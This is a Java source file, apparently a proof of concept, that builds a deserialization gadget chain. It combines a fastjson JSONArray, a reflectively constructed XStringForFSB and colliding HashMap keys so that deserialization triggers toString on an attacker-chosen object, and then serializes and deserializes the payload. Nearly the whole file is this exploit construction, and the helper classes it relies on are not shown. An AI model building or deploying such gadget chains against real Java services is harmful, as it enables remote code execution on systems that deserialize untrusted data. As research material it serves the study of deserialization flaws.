package com.example;

import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.org.apache.xpath.internal.objects.XStringForFSB;

import java.lang.reflect.Constructor;
import java.util.HashMap;

public class Main {
    public static void main(String[] args) throws Exception {
        ToStringClass toStringClass = new ToStringClass();
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(toStringClass);
        //使用XString类调用toString方法
        XString xString = new XString("xx");
        Class<?> aClass = Class.forName("com.sun.org.apache.xpath.internal.objects.XStringForFSB");
        Constructor<?> declaredConstructor = aClass.getDeclaredConstructor(String.class);
        declaredConstructor.setAccessible(true);
        XStringForFSB o = (XStringForFSB) declaredConstructor.newInstance("xx");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",jsonArray);
        map1.put("zZ",o);
        map2.put("yy",o);
        map2.put("zZ",jsonArray);

        HashMap<Object, Object> hashMap = Tools.makeMap(map1, map2);
        byte[] ser = Tools.ser(hashMap);
        Tools.deser(ser);


    }
}